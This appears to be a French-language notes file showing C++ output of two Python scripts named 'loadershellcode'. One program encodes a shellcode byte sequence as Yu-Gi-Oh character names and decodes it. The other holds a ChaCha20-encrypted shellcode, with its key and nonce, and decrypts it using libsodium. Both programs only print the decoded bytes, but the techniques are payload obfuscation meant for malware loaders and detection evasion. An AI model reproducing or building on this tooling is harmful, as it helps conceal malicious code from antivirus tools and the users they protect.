le code cpp générer par le script loadershellcode2.py :

``` cpp#include <map>
#include <vector>
#include <string>
#include <iostream>
#include <iomanip>
#include <cstdint>

using namespace std;

map<string, uint8_t> yugioh_to_byte = {
    {"Yugi", 0x00},
    {"Kaiba", 0x02},
    {"Joey", 0x06},
    {"Tea", 0x09},
    {"Tristan", 0x0d},
    {"Bakura", 0x11},
    {"Marik", 0x15},
    {"Ishizu", 0x17},
    {"Odion", 0x18},
    {"Mai", 0x19},
    {"Weevil", 0x1b},
    {"Rex", 0x1c},
    {"Mako", 0x1f},
    {"Bandit Keith", 0x20},
    {"Pegasus", 0x21},
    {"Mokuba", 0x22},
    {"Duke", 0x25},
    {"Serenity", 0x27},
    {"Roland", 0x29},
    {"Arkana", 0x2c},
    {"Strings", 0x30},
    {"Rare Hunter", 0x31},
    {"Lumis", 0x3c},
    {"Umbra", 0x3f},
    {"Yami Yugi", 0x40},
    {"Yami Bakura", 0x41},
    {"Yami Marik", 0x42},
    {"Solomon", 0x46},
    {"Arthur", 0x48},
    {"Rebecca", 0x4c},
    {"Leon", 0x4d},
    {"Zigfried", 0x51},
    {"Alister", 0x58},
    {"Raphael", 0x59},
    {"Valon", 0x5a},
    {"Dartz", 0x5e},
    {"Gurimo", 0x6f},
    {"Johnson", 0x71},
    {"Crump", 0x72},
    {"Leichter", 0x75},
    {"Nesbitt", 0x77},
    {"Big Five", 0x7b},
    {"Noah", 0x83},
    {"Gozaburo", 0x86},
    {"Priest Seto", 0x87},
    {"Pharaoh Atem", 0x88},
    {"Mana", 0x89},
    {"Mahad", 0x8a},
    {"Isis", 0x90},
    {"Karim", 0x9f},
    {"Shada", 0xa9},
    {"Akhenaden", 0xb1},
    {"Diabound", 0xb3},
    {"Zorc", 0xb6},
    {"Blue Eyes", 0xbc},
    {"Dark Magician", 0xbe},
    {"Red Eyes", 0xc2},
    {"Exodia", 0xc9},
    {"Slifer", 0xca},
    {"Obelisk", 0xcb},
    {"Ra", 0xd2},
    {"Kuriboh", 0xd4},
    {"Celtic Guardian", 0xd6},
    {"Mystical Elf", 0xd8},
    {"Feral Imp", 0xd9},
    {"Winged Dragon", 0xdb},
    {"Summoned Skull", 0xe1},
    {"Beaver Warrior", 0xe2},
    {"Gaia Knight", 0xe6},
    {"Curse of Dragon", 0xe8},
    {"Time Wizard", 0xec},
    {"Baby Dragon", 0xee},
    {"Thousand Dragon", 0xf1},
    {"Flame Swordsman", 0xf5},
    {"Elemental Hero", 0xf7},
    {"Neo Spacian", 0xfa},
    {"Crystal Beast", 0xfd},
    {"Ancient Gear", 0xff}
};

vector<string> encoded_shellcode = {
    "Bakura",
    "Summoned Skull",
    "Flame Swordsman",
    "Alister",
    "Mokuba",
    "Umbra",
    "Rebecca",
    "Johnson",
    "Zorc",
    "Dark Magician",
    "Rex",
    "Time Wizard",
    "Crystal Beast",
    "Mako",
    "Tristan",
    "Curse of Dragon",
    "Johnson",
    "Solomon",
    "Ra",
    "Raphael",
    "Arthur",
    "Nesbitt",
    "Red Eyes",
    "Big Five",
    "Roland",
    "Time Wizard",
    "Zigfried",
    "Karim",
    "Isis",
    "Yami Yugi",
    "Pegasus",
    "Lumis",
    "Curse of Dragon",
    "Yugi",
    "Yugi",
    "Yugi",
    "Yugi",
    "Dartz",
    "Noah",
    "Baby Dragon",
    "Duke",
    "Mana",
    "Elemental Hero",
    "Noah",
    "Leon",
    "Strings",
    "Rare Hunter",
    "Exodia",
    "Akhenaden",
    "Serenity",
    "Rare Hunter",
    "Ra",
    "Mahad",
    "Joey",
    "Mahad",
    "Rex",
    "Ishizu",
    "Strings",
    "Mystical Elf",
    "Pharaoh Atem",
    "Joey",
    "Solomon",
    "Yami Marik",
    "Noah",
    "Neo Spacian",
    "Bandit Keith",
    "Leichter",
    "Kaiba",
    "Rare Hunter",
    "Ra",
    "Beaver Warrior",
    "Baby Dragon",
    "Noah",
    "Baby Dragon",
    "Serenity",
    "Ancient Gear",
    "Gaia Knight",
    "Slifer",
    "Mokuba",
    "Arkana",
    "Arkana",
    "Joey",
    "Obelisk",
    "Thousand Dragon",
    "Odion",
    "Slifer",
    "Mai",
    "Duke",
    "Diabound",
    "Celtic Guardian",
    "Celtic Guardian",
    "Blue Eyes",
    "Feral Imp",
    "Yami Yugi",
    "Roland",
    "Slifer",
    "Valon",
    "Serenity",
    "Gurimo",
    "Yami Bakura",
    "Blue Eyes",
    "Crump",
    "Priest Seto",
    "Marik",
    "Kuriboh",
    "Weevil",
    "Shada",
    "Gozaburo",
    "Pharaoh Atem",
    "Valon",
    "Gurimo",
    "Winged Dragon",
    "Tea",
    "Alister",
    "Akhenaden",
    "Mai"
};

vector<uint8_t> decode_yugioh_shellcode(const vector<string>& yugioh_encoded) {
    vector<uint8_t> decoded;
    
    for (const auto& character : yugioh_encoded) {
        auto it = yugioh_to_byte.find(character);
        if (it != yugioh_to_byte.end()) {
            decoded.push_back(it->second);
        } else {
            cerr << "Personnage Yu-Gi-Oh! inconnu: " << character << endl;
            return {};
        }
    }
    
    return decoded;
}

int main() {

    
    vector<uint8_t> decoded_shellcode = decode_yugioh_shellcode(encoded_shellcode);
    
    if (decoded_shellcode.empty()) {
        cerr << "Echec du décodage!" << endl;
        return 1;
    }
    
    cout << "Decodage reussi! Shellcode avec cle integree:" << endl;
    cout << "unsigned char shellcode[] = \"";
    
    for (size_t i = 0; i < decoded_shellcode.size(); ++i) {
        if (i % 16 == 0 && i != 0) {
            cout << "\"" << endl << "\"";
        }
        cout << "\\x" << hex << setw(2) << setfill('0') << (int)decoded_shellcode[i];
    }
    
    cout << "\";" << endl;
    cout << "// Taille: " << dec << decoded_shellcode.size() << " bytes" << endl;
    
    return 0;
}


```
le code cpp générer par le script loadershellcode3.py :

``` cpp
#include <iostream>
#include <cstdint>
#include <sodium.h>
using namespace std;
uint8_t shellcode_encrypted[] = { 0xef, 0x78, 0x61, 0xf8, 0xe9, 0x6c, 0x60, 0xd1, 0xb3, 0xd4, 0xff, 0x03, 0x04, 0xe8, 0x37, 0xbb, 0x89, 0xf6, 0xe0, 0x0d, 0x95, 0xd4, 0x1a, 0xad, 0xd3, 0x91, 0x95, 0xa3, 0x21, 0xf8, 0x58, 0xc4, 0x51, 0x59, 0xdc, 0x07, 0x93, 0x01, 0x98 };
const uint32_t shellcode_len = 39;
uint8_t key[] = { 0x2a, 0xfc, 0x9e, 0x8d, 0x15, 0xc6, 0x82, 0x5e, 0x19, 0x65, 0xab, 0x99, 0x0b, 0xdd, 0x50, 0xfb, 0x63, 0xa6, 0x90, 0x41, 0xbc, 0xe6, 0xc8, 0x26, 0x18, 0xbe, 0x1d, 0x84, 0xf5, 0x4e, 0x99, 0xe1 };
uint8_t nonce[] = { 0x54, 0xb7, 0x08, 0x15, 0x5e, 0xed, 0xdd, 0x37 };

extern "C" void chacha20_decode_cpp(uint8_t* shellcode, uint32_t length, const uint8_t* key, const uint8_t* nonce) {
    crypto_stream_chacha20_xor(shellcode, shellcode, length, nonce, key);
}

int main() {
    if (sodium_init() < 0) {
        cerr << "Erreur initialisation libsodium" << endl;
        return 1;
    }

    cout << "[+] Shellcode chiffre avant dechiffrement:" << endl;
    for (uint32_t i = 0; i < shellcode_len; i++) {
        printf("%02x ", shellcode_encrypted[i]);
    }
    cout << endl;

    chacha20_decode_cpp(shellcode_encrypted, shellcode_len, key, nonce);

    cout << "[+] Shellcode dechiffre :" << endl;
    for (uint32_t i = 0; i < shellcode_len; i++) {
        printf("%02x ", shellcode_encrypted[i]);
    }
    cout << endl;

    return 0;
}

``

